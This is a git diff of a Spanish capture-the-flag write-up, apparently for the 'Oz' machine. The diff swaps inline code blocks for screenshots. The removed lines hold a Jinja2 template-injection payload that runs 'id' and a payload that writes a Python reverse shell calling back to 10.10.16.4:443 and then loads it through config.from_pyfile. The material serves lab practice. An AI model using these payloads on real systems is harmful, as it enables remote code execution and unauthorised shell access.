@@ -166,26 +166,17 @@ Si intento crear un ticket con el siguiente payload "{{7*7}}" obtengo 49
 
 ![](/assets/images/Oz/image7.png)
 
-Usare el siguiente payload para ver si tengo RCE.
+Usare el siguiente payload para ver si tengo RCE. (El markdown me ha dado problemas y he tenido que usar una imagen)
 
-```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-```
-
-
+![](/assets/images/Oz/image12.png)
+S
 La respuesta es la siguiente:
 
 ![](/assets/images/Oz/image8.png)
 
 Me temo que estoy en un contenedor... Voy a intentar establecerme una revshell.
 
-```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/config.cfg', 'w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') }}
-```
-
-```python
-{{ config.from_pyfile('/tmp/config.cfg') }}
-```
+![](/assets/images/Oz/image13.png)
 
 ### Enumeración de sistema
 
@@ -479,4 +470,4 @@ Desde portainer puedo acceder a una shell dentro del contenedor y acceder al sis
 
 ![](/assets/images/Oz/image11.png)
 
-Espero que te haya servido. Xao
+Espero que te haya servido. Xao!
